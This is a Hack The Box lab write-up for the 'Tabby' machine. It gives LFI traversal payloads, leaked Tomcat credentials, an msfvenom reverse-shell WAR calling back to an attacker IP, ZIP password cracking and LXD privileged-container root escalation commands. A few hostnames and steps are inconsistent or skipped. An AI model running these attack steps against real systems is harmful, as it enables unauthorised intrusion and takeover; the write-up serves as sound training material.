# Tabby — From LFI to LXD Root

> **Hack The Box — Tabby**
> **Difficulty:** Medium
> **OS:** Linux
> **Target:** `10.129.86.167`

---

# 01 — Overview

Tabby is a medium-difficulty Linux machine on Hack The Box.

The initial enumeration revealed three open services:

* SSH on port `22`
* Apache HTTP on port `80`
* Apache Tomcat on port `8080`

The main web application on port `80` exposed a `file` parameter through a news endpoint. Testing this parameter revealed a **Local File Inclusion (LFI)** vulnerability.

The LFI was used to access the Tomcat configuration file and recover Tomcat credentials. These credentials were then used against the Tomcat Manager interface to deploy a WAR payload and obtain a reverse shell as the `tomcat` user.

Further enumeration uncovered a password-protected backup archive. After cracking the archive password, access was obtained as the `ash` user.

The final privilege escalation came from `ash` belonging to the **LXD group**. A custom LXD image was imported and started as a privileged container with the host filesystem mounted inside it, providing access to the root filesystem.

---

# 02 — Recon: Mapping the Attack Surface

## Initial Port Scan

The initial scan was performed against:

```bash
nmap 10.129.86.167
```

The discovered services were:

| Port | State | Service       |
| ---: | ----- | ------------- |
|   22 | Open  | SSH           |
|   80 | Open  | HTTP          |
| 8080 | Open  | HTTP / Tomcat |

The full-port scan was also running in the background to ensure that additional services were not missed.

---

## Service and Version Detection

Service enumeration identified:

```text
22/tcp   open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp   open  http  Apache httpd 2.4.41 (Ubuntu)
8080/tcp open  http  Apache Tomcat
```

The web server on port `80` was identified as:

```text
Apache/2.4.41 (Ubuntu)
```

while port `8080` was running:

```text
Apache Tomcat
```

The port `80` application was titled:

```text
Mega Hosting
```

---

# 03 — Web Enumeration: Discovering `megahosting.htb`

The Tomcat service on port `8080` initially appeared to have additional restrictions, so enumeration continued against the main HTTP service.

The website contained an interesting message referring to a data-breach recovery page:

```text
http://megahosting.htb/news.php?file=statement
```

The hostname was added to `/etc/hosts` to access the application normally.

The endpoint contained a suspicious parameter:

```text
file
```

This became the focus of further testing.

---

# 04 — LFI: The `file` Parameter

The `file` parameter was fuzzed using an LFI wordlist:

```bash
ffuf -u http://megahosting.htb/news.php?file=FUZZ \
-w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-s -ac
```

The results contained multiple traversal payloads targeting sensitive local files, including:

```text
../../../../../../../../../../../../etc/passwd
```

and encoded traversal variations.

This confirmed that the `file` parameter could be manipulated for **Local File Inclusion**.

---

# 05 — LFI Enumeration: Finding the `ash` Account

Using the LFI, `/etc/passwd` was accessed.

One of the interesting accounts was:

```text
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

This revealed a valid local user:

```text
ash
```

with a home directory at:

```text
/home/ash
```

The presence of a valid shell also made this account a potential target for later credential discovery.

---

# 06 — LFI to Tomcat Credentials

Since port `8080` was running Tomcat, the LFI was used to retrieve the Tomcat configuration.

The Tomcat users file was located at:

```text
/usr/share/tomcat9/etc/tomcat-users.xml
```

It was accessed through the vulnerable parameter:

```text
http://megahosting.htb/news.php?file=..%2F..%2F..%2F%2F..%2F..%2Fusr/share/tomcat9/etc/tomcat-users.xml
```

The configuration exposed Tomcat credentials:

```text
Username: tomcat
Password: $3cureP4s5w0rd123!
```

This provided credentials for the Tomcat management functionality.

---

# 07 — Tomcat Manager: Deploying a WAR

The discovered Tomcat credentials were initially tested against the Tomcat Manager endpoint.

The first upload attempt resulted in:

```text
403 Access denied
```

Instead of stopping there, the Tomcat management functionality was investigated further.

A JSP reverse-shell WAR payload was generated with `msfvenom`:

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
LHOST=10.10.15.95 \
LPORT=4444 \
-f war > shell.war
```

The resulting WAR file was uploaded to the Tomcat Manager interface:

```bash
curl -u 'tomcat:$3cureP4s5w0rd123!' \
http://megahosting.htb:8080/manager/text/deploy?path=/shell \
--upload-file shell.war
```

The deployed application could then be accessed at:

```text
http://manager.htb:8080/shell
```

This triggered the reverse shell.

---

# 08 — Initial Foothold: Shell as `tomcat`

The reverse shell connected back to the attacking machine.

The shell was stabilized with:

```bash
stty raw -echo; fg
```

The terminal environment was then configured:

```bash
export TERM=xterm
```

The resulting shell was:

```text
tomcat@tabby:/var/lib/tomcat9$
```

This confirmed the initial foothold as:

```text
tomcat
```

---

# 09 — File Enumeration: Finding the Backup

With access as `tomcat`, filesystem enumeration continued.

The following directory contained an interesting archive:

```text
/var/www/html/files
```

Listing the directory showed:

```text
16162020_backup.zip
archive
revoked_certs
statement
```

The file:

```text
16162020_backup.zip
```

was copied to the local attacking machine for further analysis.

---

# 10 — Cracking the Backup Archive

The ZIP archive was password protected.

`zip2john` was used to extract the password hash:

```bash
zip2john 16162020_backup.zip > hash
```

John the Ripper was then used with the `rockyou.txt` wordlist:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The password recovered was:

```text
admin@it
```

This allowed the contents of the backup archive to be accessed.

---

# 11 — User Access: `ash`

The recovered information was used to progress to the `ash` account.

The user's home directory contained:

```text
ash@tabby:~$ ls
user.txt
```

The user flag was therefore located at:

```text
/home/ash/user.txt
```

The account's group memberships were then inspected:

```bash
id
```

The result was:

```text
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

The important finding was:

```text
116(lxd)
```

The `ash` user belonged to the **LXD group**, providing the path toward privilege escalation.

---

# 12 — Privilege Escalation: LXD Group

The presence of the `lxd` group suggested that LXD could be used to interact with privileged containers.

A compressed LXD image was prepared and transferred to the target.

The image was written to `/dev/shm` and imported with:

```bash
lxc image import bob.tar.bz2 --alias bobImage
```

A container was then initialized using the image with privileged security settings:

```bash
lxc init bobImage bobVM -c security.privileged=true
```

The host filesystem was added to the container:

```bash
lxc config device add bobVM realRoot disk source=/ path=r
```

The container was started:

```bash
lxc start bobVM
```

Finally, a shell was obtained inside the container:

```bash
/snap/bin/lxc exec bobVM -- /bin/sh
```

---

# 13 — Root Access: Host Filesystem Mounted

Once inside the privileged container, the mounted filesystem was inspected.

The root flag was located with:

```bash
find / -type f -name 'root.txt' 2>/dev/null
```

The result was:

```text
/r/root/root.txt
```

The flag was then read:

```bash
cat /r/root/root.txt
```

Because the host root filesystem had been mounted inside the privileged container, the host's root files were accessible.

---

# 14 — Attack Path Summary

```text
                         ┌──────────────────────┐
                         │ 10.129.86.167        │
                         └──────────┬───────────┘
                                    │
                             Port Enumeration
                                    │
                    ┌───────────────┼───────────────┐
                    │               │               │
                   SSH             HTTP          Tomcat
                   :22             :80             :8080
                                    │
                                    ▼
                         megahosting.htb
                                    │
                                    ▼
                         news.php?file=
                                    │
                                    ▼
                                  LFI
                                    │
                       ┌────────────┴────────────┐
                       │                         │
                  /etc/passwd            tomcat-users.xml
                       │                         │
                       ▼                         ▼
                     ash                  Tomcat Credentials
                                                 │
                                                 ▼
                                        Tomcat Manager
                                                 │
                                                 ▼
                                             WAR Upload
                                                 │
                                                 ▼
                                          Reverse Shell
                                                 │
                                                 ▼
                                               tomcat
                                                 │
                                                 ▼
                                      16162020_backup.zip
                                                 │
                                                 ▼
                                           zip2john + John
                                                 │
                                                 ▼
                                                ash
                                                 │
                                                 ▼
                                            lxd Group
                                                 │
                                                 ▼
                                      Privileged LXD Container
                                                 │
                                                 ▼
                                      Host Filesystem Mounted
                                                 │
                                                 ▼
                                                root
```

---

# 15 — Key Takeaways

### LFI Can Expose More Than `/etc/passwd`

The `file` parameter provided local file inclusion and was useful for reading application configuration files.

The important discovery was not only the `ash` account but also the Tomcat configuration containing authentication credentials.

### Configuration Files Are Valuable

The Tomcat configuration exposed:

```text
tomcat : $3cureP4s5w0rd123!
```

Application configuration files should never be assumed to be harmless when an LFI vulnerability is present.

### Tomcat Management Interfaces

The discovered credentials provided access to Tomcat management functionality.

A WAR payload was used to obtain command execution through the Tomcat application server.

### Backup Files

The backup archive:

```text
16162020_backup.zip
```

was password protected, but the password could be recovered using:

```bash
zip2john
john
```

This demonstrates why backup archives should receive the same security controls as production data.

### Group Membership Matters

After obtaining access as `ash`, the following group membership stood out:

```text
lxd
```

Group enumeration should always be part of Linux privilege-escalation checks.

### LXD Privilege Escalation

A privileged LXD container was created with the host filesystem mounted into it.

This provided direct access to files on the host system, including:

```text
/r/root/root.txt
```

---

# 16 — Tools Used

| Tool                  | Purpose                                        |
| --------------------- | ---------------------------------------------- |
| Nmap                  | Port and service enumeration                   |
| FFUF                  | LFI/file parameter fuzzing                     |
| cURL                  | HTTP interaction and Tomcat deployment         |
| Burp Suite            | Web application testing                        |
| Metasploit / msfvenom | WAR reverse-shell payload generation           |
| Netcat                | Reverse shell                                  |
| `zip2john`            | Extract ZIP password hash                      |
| John the Ripper       | Password cracking                              |
| SSH                   | Remote access                                  |
| LXC/LXD               | Container interaction and privilege escalation |

---

# 17 — Conclusion

Tabby demonstrates a complete Linux compromise built from several stages.

The assessment started with basic network enumeration and identified an Apache web server alongside an Apache Tomcat instance.

The main website contained a file parameter that was vulnerable to **Local File Inclusion**. Rather than stopping at `/etc/passwd`, the LFI was used to inspect application configuration and recover Tomcat credentials.

Those credentials allowed a WAR payload to be deployed through Tomcat, resulting in a reverse shell as `tomcat`.

Further filesystem enumeration uncovered a password-protected backup archive. After cracking the archive password, access was obtained as `ash`.

The final escalation was based on `ash` belonging to the **LXD group**. A privileged container was created with the host filesystem mounted inside it, ultimately providing access to the host's root files.

The complete attack chain was:

**Port Enumeration → LFI → Tomcat Configuration Disclosure → Tomcat Credentials → WAR Deployment → `tomcat` Shell → Backup Archive → Password Cracking → `ash` → LXD Group → Privileged Container → Host Filesystem → Root**
